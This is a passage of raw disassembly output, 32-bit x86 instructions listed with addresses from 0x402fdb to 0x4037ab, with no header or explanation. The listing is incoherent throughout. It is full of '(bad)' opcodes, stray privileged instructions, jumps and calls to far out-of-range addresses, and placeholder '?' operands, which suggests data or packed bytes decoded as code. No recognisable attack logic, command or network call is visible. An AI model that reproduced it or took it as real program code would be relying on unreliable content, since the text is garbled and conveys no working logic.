  402fdb:	or     BYTE PTR [ecx],bl
  402fdd:	xor    al,0xc2
  402fdf:	inc    edx
  402fe0:	add    DWORD PTR [esi+0x7f],esp
  402fe3:	or     cl,dh
  402fe5:	bnd jge 0x402f9c
  402fe8:	mov    esi,0xf9ffcd10
  402fed:	or     al,0x1c
  402fef:	int    0xc5
  402ff1:	(bad)  
  402ff2:	popf   
  402ff3:	jno    0x402ffc
  402ff5:	xor    esi,DWORD PTR [edi+0x19]
  402ff8:	xor    DWORD PTR [eax-0x5a769115],edi
  402ffe:	adc    bl,bl
  403000:	iret   
  403001:	xor    DWORD PTR cs:[ebx],0x7f3a4d0
  403008:	(bad)  
  403009:	in     eax,dx
  40300a:	div    BYTE PTR [esi-0x55]
  40300d:	aad    0xb9
  40300f:	or     dl,BYTE PTR cs:0xfd2e5c03
  403016:	dec    esp
  403017:	shl    BYTE PTR cs:0x12be5f73,1
  40301e:	sbb    al,0xe8
  403020:	call   0x1d821b82
  403025:	sbb    edx,esp
  403027:	pop    ebx
  403028:	xchg   esi,eax
  403029:	scas   eax,DWORD PTR es:[edi]
  40302a:	not    BYTE PTR ds:0x422bf09c
  403030:	add    al,0x9e
  403032:	mov    ch,0xf6
  403034:	cmp    eax,0xe1c4252
  403039:	sbb    eax,0x6f103910
  40303e:	push   edx
  40303f:	mov    ebp,0xbebf15e
  403044:	std    
  403045:	mov    dl,0xa
  403047:	nop
  403048:	inc    ebx
  403049:	push   ss
  40304a:	or     al,0xcb
  40304c:	add    edx,DWORD PTR [esp+edx*1]
  40304f:	lock xchg edi,eax
  403051:	xchg   BYTE PTR ds:0x418af67f,dh
  403057:	add    DWORD PTR [ebp+0xb6f087c],ecx
  40305d:	sbb    BYTE PTR [eax-0x610390ae],bh
  403063:	fcom   DWORD PTR [ecx+0x3]
  403066:	add    al,0x29
  403068:	shl    DWORD PTR [edx+eax*8+0x56],0xeb
  40306d:	jle    0x40307a
  40306f:	mov    DWORD PTR [eax+eax*4-0x26],esp
  403073:	mov    al,BYTE PTR [edi+0x5b]
  403076:	mov    eax,0x12eb4341
  40307b:	rol    BYTE PTR [eax+0x4311ff9],1
  403081:	jns    0x4030fc
  403083:	jns    0x4030fe
  403085:	or     esi,DWORD PTR [ebp+edi*1+0xc]
  403089:	je     0x4030d4
  40308b:	or     eax,0x740e5574
  403090:	jo     0x4030f8
  403092:	(bad)  [ebx+eax*2+0x24]
  403096:	or     BYTE PTR [eax],0x11
  403099:	mov    BYTE PTR [ecx+0x21],ah
  40309c:	imul   BYTE PTR [eax-0x7b]
  40309f:	enter  0xc789,0x30
  4030a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030a4:	fsub   DWORD PTR [edi-0x5462bf76]
  4030aa:	jmp    0x403129
  4030ac:	adc    bh,ah
  4030ae:	cmp    DWORD PTR [ecx+edi*2],0x31
  4030b2:	fsubr  QWORD PTR [ebp+ecx*4+0x34]
  4030b6:	aam    0xb8
  4030b8:	adc    ch,cl
  4030ba:	or     ecx,DWORD PTR ds:0xeced5b85
  4030c0:	(bad)  
  4030c1:	call   0x4cb52fc8
  4030c6:	pop    ebx
  4030c7:	call   0xa303e2d
  4030cc:	and    esi,DWORD PTR [esi]
  4030ce:	or     BYTE PTR [ecx+0x3b],cl
  4030d1:	pop    ds
  4030d2:	ss pop ecx
  4030d4:	arpl   WORD PTR [edi],dx
  4030d6:	pop    ss
  4030d7:	add    dl,BYTE PTR [ecx-0x29]
  4030da:	cmp    al,0xec
  4030dc:	sbb    BYTE PTR [eax+0x3b],bl
  4030df:	jns    0x4030b9
  4030e1:	and    bl,BYTE PTR [edx+0x3f]
  4030e4:	xchg   esp,eax
  4030e5:	adc    DWORD PTR [edi],ebx
  4030e7:	adc    bh,bh
  4030e9:	add    dl,BYTE PTR [ecx]
  4030eb:	jns    0x403126
  4030ed:	dec    esp
  4030ee:	mov    ds:0x4d08c783,eax
  4030f3:	jne    0x70c9860d
  4030f9:	dec    ebp
  4030fa:	pop    ebp
  4030fb:	pop    ecx
  4030fc:	jmp    0x4d60b274
  403101:	test   al,0x59
  403103:	pop    es
  403104:	jnp    0x4030a1
  403106:	jns    0x40312e
  403108:	sti    
  403109:	add    DWORD PTR [esp+0x14],ebp
  40310d:	mov    cl,BYTE PTR [edi]
  40310f:	test   BYTE PTR [ebx+0x52],0xe4
  403113:	nop
  403114:	xchg   ecx,eax
  403115:	out    0x61,eax
  403117:	jge    0x4030aa
  403119:	pushf  
  40311a:	xor    ah,al
  40311c:	push   cs
  40311d:	sub    al,0x9c
  40311f:	cmc    
  403120:	mov    eax,ds:0xdf7641c9
  403125:	cwde   
  403126:	add    al,0x4d
  403128:	jne    0x403118
  40312a:	push   ss
  40312b:	ss repz xor esp,ebx
  40312f:	xchg   esi,eax
  403130:	sub    eax,0x7aeb3876
  403135:	(bad)  
  403136:	(bad)  
  403137:	adc    edx,DWORD PTR [eax]
  403139:	adc    BYTE PTR [ebp+0x667ba1b7],al
  40313f:	loop   0x403190
  403141:	cwde   
  403142:	cmp    DWORD PTR [edx],eax
  403144:	sbb    al,0x93
  403146:	sub    esi,DWORD PTR [ecx+0x6c]
  403149:	stos   DWORD PTR es:[edi],eax
  40314a:	or     BYTE PTR [ebp+0x4],cl
  40314d:	std    
  40314e:	add    ebx,DWORD PTR [edi]
  403150:	sbb    DWORD PTR [eax],esp
  403152:	inc    ebx
  403153:	lods   al,BYTE PTR ds:[esi]
  403154:	les    edi,FWORD PTR [ebx-0x16]
  403157:	jmp    0x40319e
  403159:	pop    ss
  40315a:	out    0xf8,al
  40315c:	les    ebx,FWORD PTR [ebx+0x6b]
  40315f:	jno    0x4031c4
  403161:	inc    edi
  403162:	add    DWORD PTR [eax+edi*1],ebp
  403165:	add    cl,dl
  403167:	add    ebx,DWORD PTR [eiz*8+0x333c977]
  40316e:	mov    BYTE PTR [ebp+0x3f],ah
  403171:	xchg   esp,eax
  403172:	adc    al,0x13
  403174:	lock push cs
  403176:	xor    edi,DWORD PTR [eax+esi*1-0x5213eaf7]
  40317d:	fs push 0x90927f02
  403183:	mov    al,0x11
  403185:	mov    ebx,eax
  403187:	icebp  
  403188:	adc    edi,esp
  40318a:	add    bh,BYTE PTR [edi]
  40318c:	mul    DWORD PTR [esp]
  40318f:	mov    ecx,eax
  403191:	mov    ah,BYTE PTR [esp+0xc]
  403195:	pop    edx
  403196:	(bad)  
  403197:	cdq    
  403198:	push   0xca089bb0
  40319d:	pop    ecx
  40319e:	pop    ecx
  40319f:	push   esp
  4031a0:	mov    ds:0x2cd161bb,al
  4031a5:	mov    ds:0x4828374a,eax
  4031aa:	xor    DWORD PTR [edx-0x79b48ed3],ecx
  4031b0:	or     BYTE PTR [ebp+0x78c5c003],bl
  4031b6:	jne    0x403201
  4031b8:	xor    eax,DWORD PTR [edi-0x69]
  4031bb:	pop    es
  4031bc:	loopne 0x4031c8
  4031be:	sahf   
  4031bf:	ds jnp 0x4031a6
  4031c2:	imul   ecx,DWORD PTR [ebp-0x71],0xffffffd1
  4031c6:	jbe    0x4031f2
  4031c8:	sbb    ch,BYTE PTR [esi-0xf]
  4031cb:	pop    es
  4031cc:	call   0xd84db388
  4031d1:	inc    esp
  4031d2:	mov    ebx,DWORD PTR [eax]
  4031d4:	ret    
  4031d5:	sbb    ecx,DWORD PTR [edx]
  4031d7:	pop    es
  4031d8:	mov    al,0xe0
  4031da:	fistp  QWORD PTR [ebp-0x13]
  4031dd:	mov    ch,0x82
  4031df:	sbb    esp,DWORD PTR [ebx+ebx*2]
  4031e2:	push   eax
  4031e3:	dec    eax
  4031e4:	cmp    cl,bh
  4031e6:	xor    edi,edi
  4031e8:	cmp    DWORD PTR [edx+0x7dc6f012],0xffffffe8
  4031ef:	ror    BYTE PTR ds:0x325b6d83,0x38
  4031f6:	xor    al,0x52
  4031f8:	lock iret 
  4031fa:	or     al,bh
  4031fc:	movzx  eax,BYTE PTR [eax+0x1]
  403200:	add    DWORD PTR [edi+0x70],ecx
  403203:	xor    al,0x57
  403205:	in     al,0xba
  403207:	aas    
  403208:	push   eax
  403209:	push   es
  40320a:	iret   
  40320b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40320c:	push   cs
  40320d:	shl    DWORD PTR [esi],0xe0
  403210:	add    esi,edi
  403212:	mov    edi,?
  403214:	out    dx,al
  403215:	xchg   DWORD PTR [ebp-0x1365a100],edi
  40321b:	aam    0x3b
  40321d:	lock je 0x40327f
  403220:	xor    DWORD PTR [esi],0xffffffd8
  403223:	lea    ebp,[ebp+0x10]
  403226:	or     BYTE PTR [ecx+0x8],dl
  403229:	dec    ebp
  40322a:	cmp    DWORD PTR [eax],0xffffffd2
  40322d:	cmp    al,0xdf
  40322f:	pop    es
  403230:	cld    
  403231:	out    0x7,al
  403233:	sub    ah,ah
  403235:	cmp    edi,ebx
  403237:	jle    0x403258
  403239:	out    0x19,eax
  40323b:	pop    ss
  40323c:	sar    BYTE PTR [ebx-0x77],0x6f
  403240:	inc    eax
  403241:	push   0xf
  403243:	scas   eax,DWORD PTR es:[edi]
  403244:	(bad)  
  403245:	add    ecx,ebp
  403247:	iret   
  403248:	sub    ecx,ebx
  40324a:	pop    DWORD PTR [ecx+0x2b]
  40324d:	push   0x258d4807
  403252:	or     ah,0x75
  403255:	mov    ebx,0xe476f8ee
  40325a:	mov    edi,0xff2b63eb
  40325f:	dec    eax
  403260:	adc    al,0x6b
  403262:	and    eax,0x11a86efe
  403267:	mov    DWORD PTR [ebp-0x10],edi
  40326a:	cmp    ebx,DWORD PTR [ebp-0x10]
  40326d:	jge    0x403281
  40326f:	add    al,0x4c
  403271:	iret   
  403272:	pop    esp
  403273:	sub    DWORD PTR [eax],ebx
  403275:	sub    al,0x8f
  403277:	inc    edi
  403278:	push   edx
  403279:	xor    ecx,ecx
  40327b:	mov    dh,0x11
  40327d:	xor    al,0x0
  40327f:	add    eax,eax
  403281:	fist   DWORD PTR [eax+0x16]
  403284:	in     eax,dx
  403285:	mov    cl,0xc1
  403287:	mov    dh,0xe5
  403289:	adc    ch,BYTE PTR [eax+0x4d]
  40328c:	pop    ebp
  40328d:	cmp    bl,ch
  40328f:	push   ss
  403290:	or     DWORD PTR [ebp+0x30],eax
  403293:	mov    al,0x75
  403295:	sub    ecx,esi
  403297:	sbb    ch,al
  403299:	mov    ebx,0xda23da22
  40329e:	es jle 0x4032c6
  4032a1:	(bad)  
  4032a2:	fistp  QWORD PTR [ecx+0x11d8f7da]
  4032a8:	add    DWORD PTR [ecx+0x2bd30818],ecx
  4032ae:	xlat   BYTE PTR ds:[ebx]
  4032af:	pop    eax
  4032b0:	mov    BYTE PTR [esi+edi*4],0x5
  4032b4:	imul   ecx,DWORD PTR ds:0x735a0ff3,0xfffffff4
  4032bb:	add    DWORD PTR [esi+0x28],edi
  4032be:	cmc    
  4032bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032c0:	push   ss
  4032c1:	ficomp WORD PTR [edi]
  4032c3:	or     BYTE PTR [edi+edi*8],al
  4032c6:	imul   ecx,DWORD PTR [ebx+0x4a],0x1c
  4032ca:	inc    ebx
  4032cb:	xor    esi,esi
  4032cd:	sbb    eax,0xaa3bbb6c
  4032d2:	aaa    
  4032d3:	lea    eax,[eax+esi*4]
  4032d6:	pusha  
  4032d7:	hlt    
  4032d8:	retf   
  4032d9:	pop    eax
  4032da:	inc    esi
  4032db:	inc    ebp
  4032dc:	mov    ah,0x8
  4032de:	or     edi,DWORD PTR [edi]
  4032e0:	out    0x6a,eax
  4032e2:	dec    edi
  4032e3:	ins    BYTE PTR es:[edi],dx
  4032e4:	loope  0x40326d
  4032e6:	fmul   DWORD PTR [ebx-0x3f821a75]
  4032ec:	push   esp
  4032ed:	sub    ebx,0x4
  4032f0:	and    BYTE PTR [esi+edi*4],ah
  4032f3:	add    BYTE PTR [edx-0x29],0x17
  4032f7:	xor    ebp,DWORD PTR [edi+0x5a]
  4032fa:	shl    BYTE PTR [edx+0x274912d0],0x1f
  403301:	mov    DWORD PTR [ebx],edx
  403303:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403304:	xchg   ebx,eax
  403305:	jp     0x40335b
  403307:	xchg   esi,eax
  403308:	mov    ebx,esi
  40330a:	loopne 0x40332e
  40330c:	pop    eax
  40330d:	popf   
  40330e:	and    al,BYTE PTR [edi]
  403310:	mov    ecx,0xa06b951a
  403315:	or     DWORD PTR [esi],edi
  403317:	lahf   
  403318:	sbb    BYTE PTR [eax],ah
  40331a:	sbb    eax,0x1a
  40331d:	mov    cl,al
  40331f:	es adc al,0x7
  403322:	dec    ebx
  403323:	pusha  
  403324:	xor    DWORD PTR [esi-0x60],ebx
  403327:	inc    esp
  403328:	mov    ah,0xc
  40332a:	inc    DWORD PTR [ebx-0x8]
  40332d:	pop    ss
  40332e:	add    cl,BYTE PTR [esp+esi*4]
  403331:	inc    edx
  403332:	mov    ebx,0x682dd777
  403337:	stos   DWORD PTR es:[edi],eax
  403338:	ins    BYTE PTR es:[edi],dx
  403339:	push   ebx
  40333a:	clc    
  40333b:	(bad)  
  40333c:	fnstcw WORD PTR [ebx-0x21]
  40333f:	mov    ds:0x2b809c07,eax
  403344:	and    esi,ebx
  403346:	xchg   ebx,eax
  403347:	push   eax
  403348:	pop    ss
  403349:	and    al,BYTE PTR [esi+ebp*8-0x3f]
  40334d:	les    esi,FWORD PTR [edx-0x275cae8a]
  403353:	int    0x3c
  403355:	or     ah,dh
  403357:	inc    edx
  403358:	jne    0x403360
  40335a:	inc    esp
  40335b:	outs   dx,BYTE PTR ds:[esi]
  40335c:	fucomi st,st(6)
  40335e:	sbb    cl,BYTE PTR [ecx+0x10051043]
  403364:	cmp    ecx,DWORD PTR [eax]
  403366:	cs jo  0x403326
  403369:	inc    ecx
  40336a:	call   DWORD PTR [bx+di+0x12]
  40336e:	hlt    
  40336f:	mov    eax,ds:0x1709e530
  403374:	icebp  
  403375:	mov    ecx,DWORD PTR [edi+0x74]
  403378:	sub    esp,DWORD PTR [ebp-0x303503f2]
  40337e:	lahf   
  40337f:	push   es
  403380:	or     BYTE PTR [edi+eax*1+0xc],dh
  403384:	jne    0x403391
  403386:	jle    0x4033fc
  403388:	mov    ecx,DWORD PTR [esi]
  40338a:	mov    BYTE PTR [eax],dl
  40338c:	ins    DWORD PTR es:[edi],dx
  40338d:	es or  eax,0xb112dfa5
  403393:	rol    DWORD PTR [edx],0x89
  403396:	sti    
  403397:	ret    
  403398:	pop    edx
  403399:	scas   eax,DWORD PTR es:[edi]
  40339a:	test   al,0x42
  40339c:	hlt    
  40339d:	jbe    0x4033f0
  40339f:	dec    ebx
  4033a0:	lea    esi,[ebp-0x4]
  4033a3:	(bad)  
  4033a4:	fadd   DWORD PTR [ebp-0x74]
  4033a7:	xor    eax,0xe1a48168
  4033ac:	mov    bl,BYTE PTR [eax]
  4033ae:	(bad)  
  4033af:	sbb    bh,BYTE PTR [ebp+0x1]
  4033b2:	stos   DWORD PTR es:[edi],eax
  4033b3:	add    eax,0x765cfb80
  4033b8:	or     al,0x28
  4033ba:	dec    ecx
  4033bb:	ins    DWORD PTR es:[edi],dx
  4033bc:	xchg   ebx,eax
  4033bd:	mov    al,ds:0x9ea4805f
  4033c2:	jmp    0x684d:0xd78c9102
  4033c9:	call   0x96303bc5
  4033ce:	fdivr  DWORD PTR [eax]
  4033d0:	hlt    
  4033d1:	mov    ecx,0xff86844
  4033d6:	ss inc esi
  4033d8:	test   DWORD PTR [eax],0x7be81de2
  4033de:	xor    bh,ah
  4033e0:	adc    eax,0x857baa3a
  4033e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033e6:	cmp    eax,0x87ff2450
  4033eb:	mov    DWORD PTR [eax+0x7a5630ed],eax
  4033f1:	clc    
  4033f2:	push   eax
  4033f3:	adc    eax,0x7095dbe8
  4033f8:	les    edi,FWORD PTR [ebp+0x20]
  4033fb:	or     eax,0x707b3880
  403400:	outs   dx,BYTE PTR ds:[esi]
  403401:	jmp    0x403472
  403403:	inc    ecx
  403404:	pop    es
  403405:	js     0x403408
  403407:	pop    esp
  403408:	mov    esi,0x450c3f27
  40340d:	and    BYTE PTR [esi-0x2f],bh
  403410:	aas    
  403411:	or     eax,0xac60043a
  403416:	adc    bl,ch
  403418:	mov    al,ds:0x190dd922
  40341d:	push   es
  40341e:	pop    ss
  40341f:	js     0x4033d4
  403421:	pop    es
  403422:	mov    ?,ebp
  403424:	adc    BYTE PTR [ecx],cl
  403426:	xor    edx,DWORD PTR [esi]
  403428:	gs mov bl,0xd8
  40342b:	fbld   TBYTE PTR [ecx-0x7203a2d5]
  403431:	inc    ebx
  403432:	add    DWORD PTR [ecx+0x74],ebp
  403435:	jo     0x403408
  403437:	mov    eax,0x41b8d969
  40343c:	inc    ebx
  40343d:	jge    0x40342b
  40343f:	sub    edx,edi
  403441:	mov    dh,0x8
  403443:	not    DWORD PTR [esi-0x5b]
  403446:	ret    
  403447:	inc    eax
  403448:	cmp    eax,0xb3a970b7
  40344d:	ss jnp 0x4034ac
  403450:	inc    edi
  403451:	push   edi
  403452:	enter  0x1938,0x3a
  403456:	pop    ecx
  403457:	dec    eax
  403458:	data16 outs dx,BYTE PTR ds:[esi]
  40345a:	inc    esi
  40345b:	stos   BYTE PTR es:[edi],al
  40345c:	dec    BYTE PTR [ebp+0x3]
  40345f:	les    edi,FWORD PTR [ebx]
  403461:	fcmovnu st,st(0)
  403463:	ins    DWORD PTR es:[edi],dx
  403464:	adc    DWORD PTR [edx],0x74
  403467:	jnp    0x403468
  403469:	mov    esp,0xbf2bd61f
  40346e:	aas    
  40346f:	(bad)  
  403471:	sub    al,0x8d
  403473:	push   ebx
  403474:	mov    bl,0xc2
  403476:	push   eax
  403477:	jg     0x4034d5
  403479:	mov    BYTE PTR [ebp+ebx*1-0x3647a3ce],0x66
  403481:	mov    bh,0x78
  403483:	push   cs
  403484:	push   ebp
  403485:	dec    eax
  403486:	push   eax
  403487:	sub    DWORD PTR [esi+0x7],ebx
  40348a:	jno    0x403465
  40348c:	mov    al,0x40
  40348e:	pop    edi
  40348f:	aas    
  403490:	inc    eax
  403491:	and    eax,0x597a1c20
  403496:	in     al,dx
  403497:	loopne 0x40341e
  403499:	dec    ecx
  40349a:	fild   WORD PTR [eax+0x60]
  40349d:	inc    esi
  40349e:	or     DWORD PTR [eax],0x7f
  4034a1:	loope  0x4034a2
  4034a3:	sti    
  4034a4:	dec    DWORD PTR ds:0x72656b68
  4034aa:	outs   dx,BYTE PTR ds:[esi]
  4034ab:	gs ins BYTE PTR es:[edi],dx
  4034ad:	xor    esi,DWORD PTR [edx]
  4034af:	cs fs ins BYTE PTR es:[edi],dx
  4034b2:	ins    BYTE PTR es:[edi],dx
  4034b3:	add    ah,al
  4034b5:	gs je  0x403504
  4034b8:	outs   dx,DWORD PTR ds:[esi]
  4034b9:	outs   dx,BYTE PTR ds:[esi]
  4034ba:	addr16 cwde 
  4034bc:	and    edi,DWORD PTR [edi+edi*8+0x68746150]
  4034c3:	dec    esi
  4034c4:	popa   
  4034c5:	ins    DWORD PTR es:[edi],dx
  4034c6:	gs inc ecx
  4034c8:	adc    edx,edi
  4034ca:	fdiv   st(6),st
  4034cc:	inc    edx
  4034cd:	mov    esp,0xa8d23041
  4034d2:	fbstp  TBYTE PTR [esi+0x46]
  4034d5:	stos   BYTE PTR es:[edi],al
  4034d6:	ins    DWORD PTR es:[edi],dx
  4034d7:	xlat   BYTE PTR ds:[ebx]
  4034d8:	ds in  al,dx
  4034da:	mov    BYTE PTR [ebp-0x12],0x11
  4034de:	addr16 push 0x95007419
  4034e4:	dec    edx
  4034e5:	mov    dl,0xdc
  4034e7:	xor    dl,BYTE PTR [eax+0x4e]
  4034ea:	add    DWORD PTR [ecx-0x6b37f27f],eax
  4034f0:	sbb    eax,0x553b2202
  4034f5:	lods   al,BYTE PTR ds:[esi]
  4034f6:	or     cl,cl
  4034f8:	ins    BYTE PTR es:[edi],dx
  4034f9:	hlt    
  4034fa:	addr16 pop ds
  4034fc:	dec    ecx
  4034fd:	jbe    0x403571
  4034ff:	adc    BYTE PTR [ebp-0x2],cl
  403502:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403503:	test   BYTE PTR [edx+0x787b6ab6],bh
  403509:	(bad)  
  40350a:	cwde   
  40350b:	xor    BYTE PTR [esi-0x18],al
  40350e:	sub    dh,0x3b
  403511:	fisttp WORD PTR [ebx]
  403513:	jbe    0x4034b5
  403515:	std    
  403516:	dec    sp
  403518:	pop    ds
  403519:	cmp    esi,DWORD PTR [eax]
  40351b:	shr    DWORD PTR ds:0x41d8c67,cl
  403521:	(bad)  
  403522:	int    0xc3
  403524:	stos   BYTE PTR es:[edi],al
  403525:	fild   DWORD PTR [ebx]
  403527:	repnz add BYTE PTR [esi+0x79f84d17],ch
  40352e:	inc    esi
  40352f:	sub    al,0x21
  403531:	std    
  403532:	pop    ds
  403533:	(bad)  
  403535:	ret    0x6cb7
  403538:	punpckhdq mm0,QWORD PTR ds:0xc03f356
  40353f:	or     al,0xe4
  403541:	xchg   esi,eax
  403542:	clc    
  403543:	outs   dx,BYTE PTR ds:[esi]
  403544:	xor    al,0xe4
  403546:	sbb    al,BYTE PTR [eax+0xf0020bd]
  40354c:	stc    
  40354d:	dec    esp
  40354e:	mov    bh,0x2d
  403550:	jge    0x4035cf
  403552:	repz push esp
  403554:	or     al,BYTE PTR ds:0x50e90fee
  40355a:	js     0x403569
  40355c:	retf   
  40355d:	cmp    eax,0xf90b95f6
  403562:	pop    esi
  403563:	push   ss
  403564:	mov    dh,0x36
  403566:	jb     0x403553
  403568:	add    esp,DWORD PTR [ebp+0x2ee4bde4]
  40356e:	je     0x40357b
  403570:	and    eax,0x23ced06b
  403575:	cmp    ecx,DWORD PTR ds:0x380f0adc
  40357b:	aaa    
  40357c:	push   ss
  40357d:	(bad)  
  40357e:	jmp    DWORD PTR [ecx]
  403580:	dec    edx
  403581:	dec    ebx
  403582:	in     al,0x66
  403584:	cs jbe 0x40354d
  403587:	sub    edx,eax
  403589:	and    edx,eax
  40358b:	fidivr DWORD PTR [ebx]
  40358d:	xchg   edx,eax
  40358e:	dec    edi
  40358f:	or     eax,0x6412a198
  403594:	adc    al,0x5c
  403596:	jne    0x4035fc
  403598:	enter  0xbf66,0x72
  40359c:	xchg   BYTE PTR [esp+ebp*2+0x17],dh
  4035a0:	cmp    esi,ebx
  4035a2:	ret    0x854a
  4035a5:	mov    eax,ds:0x392f1b36
  4035aa:	dec    DWORD PTR [esi+eax*2+0x53678cad]
  4035b1:	outs   dx,DWORD PTR ds:[esi]
  4035b2:	data16 je 0x40362c
  4035b5:	popa   
  4035b6:	jle    0x40361b
  4035b8:	or     al,al
  4035ba:	jb     0x403621
  4035bc:	(bad)  
  4035bd:	arpl   WORD PTR gs:[ecx+0x6c],sp
  4035c1:	gs jae 0x403611
  4035c4:	add    BYTE PTR [esi-0x1a],dl
  4035c7:	into   
  4035c8:	sbb    esp,ebx
  4035ca:	sbb    eax,0x2280aac9
  4035cf:	mov    edi,0x9c7ea182
  4035d4:	inc    eax
  4035d5:	scas   eax,DWORD PTR es:[edi]
  4035d6:	xor    al,0xd3
  4035d8:	cmc    
  4035d9:	cmp    DWORD PTR [ebx],ebx
  4035db:	retf   
  4035dc:	dec    esi
  4035dd:	xchg   BYTE PTR [ebx-0x6e3abcb6],ch
  4035e3:	test   eax,0xd021ce81
  4035e8:	add    al,0x95
  4035ea:	or     cl,BYTE PTR [ebx-0x3b13c2aa]
  4035f0:	sbb    edi,DWORD PTR [eax]
  4035f2:	jne    0x4035bb
  4035f4:	jnp    0x40357f
  4035f6:	ja     0x4035fc
  4035f8:	push   ds
  4035f9:	mov    edx,DWORD PTR ds:0x6a31024
  4035ff:	lahf   
  403600:	dec    eax
  403601:	bnd jnp 0x403611
  403604:	mov    esi,0xc84f755a
  403609:	or     eax,0x40a01a0
  40360e:	sar    DWORD PTR [esi],cl
  403610:	mov    WORD PTR [ebp-0x30],?
  403613:	idiv   DWORD PTR [ecx+0x7c]
  403616:	dec    edi
  403617:	cmp    eax,DWORD PTR ds:0x91753a
  40361d:	fsub   DWORD PTR [edi+eax*1-0x72]
  403621:	inc    esi
  403622:	jmp    0x403656
  403624:	jns    0x4035cb
  403626:	and    al,0x7a
  403628:	sub    eax,DWORD PTR [edi]
  40362a:	rcr    edx,0x3b
  40362d:	push   ds
  40362e:	and    esi,DWORD PTR [ebp-0x4a]
  403631:	aaa    
  403632:	sbb    BYTE PTR [ebx],dl
  403634:	jbe    0x403621
  403636:	push   cs
  403637:	nop
  403638:	fsub   QWORD PTR [edi+ebp*4-0x6b]
  40363c:	ja     0x4036bc
  40363e:	inc    edx
  40363f:	sbb    bl,0x8b
  403642:	add    bh,bh
  403644:	push   eax
  403645:	or     BYTE PTR ds:0x45d80160,dl
  40364b:	sbb    DWORD PTR [ebx+0x587f5202],edx
  403651:	das    
  403652:	adc    BYTE PTR ds:0xa08f90da,ah
  403658:	call   0xb09137e8
  40365d:	fild   DWORD PTR [ebx-0x6b47df90]
  403663:	je     0x40366b
  403665:	push   cs
  403666:	add    BYTE PTR [eax+eiz*8],bl
  403669:	inc    ecx
  40366a:	dec    ebx
  40366b:	mov    ebp,0x9f4305d5
  403670:	push   ss
  403671:	cmp    eax,0xb7f17b81
  403676:	jge    0x4036a2
  403678:	pop    edx
  403679:	xchg   ecx,eax
  40367a:	or     al,0xe
  40367c:	push   edx
  40367d:	push   ebp
  40367e:	das    
  40367f:	test   al,0xd5
  403681:	or     BYTE PTR [edi-0x4a43c6bf],bl
  403687:	sbb    al,0x77
  403689:	scas   al,BYTE PTR es:[edi]
  40368a:	inc    esi
  40368b:	add    BYTE PTR [ebp+0xab1c66b],0x76
  403692:	(bad)
  403695:	mov    edi,0xe02df353
  40369a:	pop    ebx
  40369b:	add    BYTE PTR [eax],dl
  40369d:	dec    edx
  40369e:	adc    al,0x88
  4036a0:	pop    ecx
  4036a1:	pop    ss
  4036a2:	jne    0x40366f
  4036a4:	cld    
  4036a5:	sub    esp,0x22
  4036a8:	pop    ds
  4036a9:	adc    BYTE PTR [eax+0x6a],0x7
  4036ad:	lea    edx,[ebp-0xb]
  4036b0:	push   edx
  4036b1:	push   0x324c6dd
  4036b6:	mov    bh,0x7
  4036b8:	push   ds
  4036b9:	lock adc DWORD PTR [ecx-0x54c4a0ed],edi
  4036c0:	pop    es
  4036c1:	xchg   ecx,eax
  4036c2:	cs mov cl,0xf
  4036c5:	cld    
  4036c6:	call   0x92e0:0xda00f00a
  4036cd:	popa   
  4036ce:	icebp  
  4036cf:	mov    cl,0x72
  4036d1:	outs   dx,BYTE PTR ds:[esi]
  4036d2:	adc    cl,BYTE PTR [ebp-0x77]
  4036d5:	dec    eax
  4036d6:	xor    DWORD PTR [ebp+0x5c],eax
  4036d9:	mov    WORD PTR [eax+eax*1+0x23],fs
  4036dd:	inc    ecx
  4036de:	jae    0x40372b
  4036e0:	icebp  
  4036e1:	and    DWORD PTR [edi],ebx
  4036e3:	(bad)  
  4036e4:	ficom  DWORD PTR [eax-0x1]
  4036e7:	add    eax,0xf7569b4
  4036ec:	cli    
  4036ed:	pop    esp
  4036ee:	shl    DWORD PTR [ebx],0xb8
  4036f1:	cld    
  4036f2:	push   eax
  4036f3:	push   0x905db22c
  4036f8:	addr16 or eax,esp
  4036fb:	add    eax,DWORD PTR [edx+ecx*1]
  4036fe:	rcr    BYTE PTR [edi-0x25],1
  403701:	shl    DWORD PTR [eax+0x66],0xe1
  403705:	push   edi
  403706:	clc    
  403707:	scas   eax,DWORD PTR es:[edi]
  403708:	sub    DWORD PTR ds:0xdc351242,0xfffffffd
  40370f:	add    DWORD PTR [edi],ecx
  403711:	add    ebp,0xffffff9e
  403714:	mov    BYTE PTR ds:0xa702af08,0xb2
  40371b:	jnp    0x40370b
  40371d:	push   esi
  40371e:	sbb    al,BYTE PTR [esi+0x0]
  403721:	inc    ecx
  403722:	add    BYTE PTR [eax],dl
  403724:	add    BYTE PTR [edi-0x16],al
  403727:	xor    esi,DWORD PTR [edi-0x43e01078]
  40372d:	or     ah,ch
  40372f:	fs mov bh,0xd9
  403732:	push   ds
  403733:	je     0x40379b
  403735:	sbb    eax,0x8d7b04c
  40373a:	sbb    BYTE PTR [edx],al
  40373c:	aas    
  40373d:	sti    
  40373e:	loope  0x40375c
  403740:	in     al,0x3
  403742:	or     ah,dl
  403744:	mov    ds:0x8c01a63c,eax
  403749:	mov    ds:0xea1c5038,eax
  40374e:	pusha  
  40374f:	or     DWORD PTR [ebp+eiz*1+0x6a1a2ace],eax
  403756:	mul    bl
  403758:	sub    eax,0xf566fd10
  40375d:	lods   al,BYTE PTR ds:[esi]
  40375e:	push   0xb87637d9
  403763:	call   0x9b645853
  403768:	mov    ebx,0x4004578b
  40376d:	sbb    BYTE PTR [ebx+0x3f0f1014],ah
  403773:	add    BYTE PTR [ebp+0x757c0e2f],cl
  403779:	retf   
  40377a:	jmp    DWORD PTR ds:0x49d832cc
  403780:	add    bl,dl
  403782:	enter  0xc407,0xb1
  403786:	(bad)  [edx+0x40a6c00c]
  40378c:	inc    ecx
  40378d:	mov    esp,0xf4030bdf
  403792:	dec    ebx
  403793:	mov    eax,0xe0119bb1
  403798:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403799:	push   0xfffffff8
  40379b:	sbb    BYTE PTR [edx],ah
  40379d:	cmp    DWORD PTR ss:0xd8ff0698,0xffffff89
  4037a5:	jle    0x4037e7
  4037a7:	nop
  4037a8:	loop   0x40374c
  4037aa:	inc    ecx
  4037ab:	aam    0xe3
